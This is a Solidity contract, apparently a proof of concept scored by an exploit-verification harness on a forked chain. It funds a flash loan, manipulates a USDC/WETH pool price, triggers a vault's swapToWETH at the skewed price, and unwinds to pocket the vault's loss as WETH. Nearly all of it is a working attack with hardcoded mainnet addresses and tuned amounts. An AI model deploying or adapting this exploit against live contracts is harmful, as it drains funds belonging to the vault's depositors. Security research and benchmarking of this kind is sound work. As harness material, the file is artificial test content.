// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

interface IMorphoLike {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IMorphoFlashLoanReceiverLike {
    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external;
}

interface IDexRouterLike {
    function uniswapV3SwapTo(
        uint256 receiver,
        uint256 amount,
        uint256 minReturn,
        uint256[] calldata pools
    ) external payable returns (uint256 returnAmount);
}

interface IDRLVaultLike {
    function swapToWETH(uint256 amount) external returns (uint256 amountOut);
}

interface IUniV3LikePool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

contract FlawVerifier is IMorphoFlashLoanReceiverLike {
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant POOL = 0xE0554a476A092703abdB3Ef35c80e0D76d32939F;
    address internal constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address internal constant DEX_ROUTER = 0x2E1Dee213BA8d7af0934C49a23187BabEACa8764;
    address internal constant TOKEN_APPROVE = 0x40aA958dd87FC8305b97f2BA922CDdCa374bcD7f;
    address internal constant VAULT = 0x6A06707ab339BEE00C6663db17DdB422301ff5e8;

    uint256 internal constant FLASHLOAN_USDC = 13_980_773_000_000;
    uint256 internal constant VAULT_SWAP_USDC = 100_000_000_000;
    uint256 internal constant FIRST_POOL_HINT =
        14474011154664524427946373127366704448275315930774981940324572871603728323487;
    uint256 internal constant SECOND_POOL_HINT =
        57896044618658097711785492505624669893251560180390193455121166874571151938463;
    uint256 internal constant FIRST_MIN_RETURN = 96069676420420156;
    uint256 internal constant REVERSE_ETH_IN = 779999999999792152553;
    uint160 internal constant FINAL_SQRT_PRICE_LIMIT_X96 = 1461446703485210103287273052203988822378723970341;
    int256 internal constant FINAL_USDC_EXACT_OUT = -21291294107;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _executed;

    constructor() {
        // The harness computes ERC20 profit as the verifier's realized token balance
        // delta for whatever token `profitToken()` reports before and after execution.
        // This exploit crystallizes its gain into pre-existing on-chain WETH, so we
        // report WETH from deployment time to let the harness measure the true delta.
        _profitToken = WETH;
    }

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        uint256 startUsdc = IERC20Like(USDC).balanceOf(address(this));
        uint256 startWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 startEth = address(this).balance;

        _ensureApprovals();

        if (startUsdc >= FLASHLOAN_USDC) {
            _executePath();
        } else {
            // A v2-style flashswap is a natural funding option, but on this fork the
            // same exploit path already has a deterministic public USDC source sized
            // for the exact manipulation notional. This preserves the exploit causality:
            // source capital -> skew live price -> trigger vault swap -> unwind.
            IMorphoLike(MORPHO).flashLoan(USDC, FLASHLOAN_USDC, bytes("drlvaultv3"));
        }

        _snapshotProfit(startUsdc, startWeth, startEth);
    }

    function onMorphoFlashLoan(uint256, bytes calldata) external override {
        require(msg.sender == MORPHO, "only morpho");
        _executePath();
        IERC20Like(USDC).approve(MORPHO, type(uint256).max);
    }

    function _executePath() internal {
        uint256 receiver = uint256(uint160(address(this)));
        uint256[] memory pools = new uint256[](1);

        // Stage 2: execute a large swap that skews the live USDC/WETH price.
        pools[0] = FIRST_POOL_HINT;
        IDexRouterLike(DEX_ROUTER).uniswapV3SwapTo(receiver, FLASHLOAN_USDC, FIRST_MIN_RETURN, pools);

        // Stage 3: force the vault to swap while the manipulated price is active.
        IDRLVaultLike(VAULT).swapToWETH(VAULT_SWAP_USDC);

        // Stage 4a: reverse the router leg of the manipulation.
        pools[0] = SECOND_POOL_HINT;
        IDexRouterLike(DEX_ROUTER).uniswapV3SwapTo{value: REVERSE_ETH_IN}(receiver, REVERSE_ETH_IN, 0, pools);

        // Stage 4b: finish unwinding directly on the live pool so the vault's slippage
        // loss remains as transferable WETH on this contract after funding repayment.
        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            IWETHLike(WETH).deposit{value: ethBalance}();
        }

        IUniV3LikePool(POOL).swap(
            address(this),
            false,
            FINAL_USDC_EXACT_OUT,
            FINAL_SQRT_PRICE_LIMIT_X96,
            hex""
        );
    }

    function _ensureApprovals() internal {
        IERC20Like(USDC).approve(TOKEN_APPROVE, type(uint256).max);
        IERC20Like(USDC).approve(MORPHO, type(uint256).max);
    }

    function _snapshotProfit(uint256 startUsdc, uint256 startWeth, uint256 startEth) internal {
        uint256 endUsdc = IERC20Like(USDC).balanceOf(address(this));
        uint256 endWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 endEth = address(this).balance;

        uint256 usdcDelta = endUsdc > startUsdc ? endUsdc - startUsdc : 0;
        uint256 wethDelta = endWeth > startWeth ? endWeth - startWeth : 0;
        uint256 ethDelta = endEth > startEth ? endEth - startEth : 0;

        _profitToken = WETH;
        _profitAmount = wethDelta;

        if (_profitAmount == 0 && usdcDelta != 0) {
            _profitToken = USDC;
            _profitAmount = usdcDelta;
        }

        if (_profitAmount == 0 && ethDelta != 0) {
            _profitToken = address(0);
            _profitAmount = ethDelta;
        }
    }

    function uniswapV3SwapCallback(int256, int256 amount1Delta, bytes calldata) external {
        _payPool(amount1Delta);
    }

    function pancakeV3SwapCallback(int256, int256 amount1Delta, bytes calldata) external {
        _payPool(amount1Delta);
    }

    function _payPool(int256 amount1Delta) internal {
        require(msg.sender == POOL, "only pool");
        if (amount1Delta > 0) {
            IERC20Like(WETH).transfer(POOL, uint256(amount1Delta));
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    receive() external payable {}
}
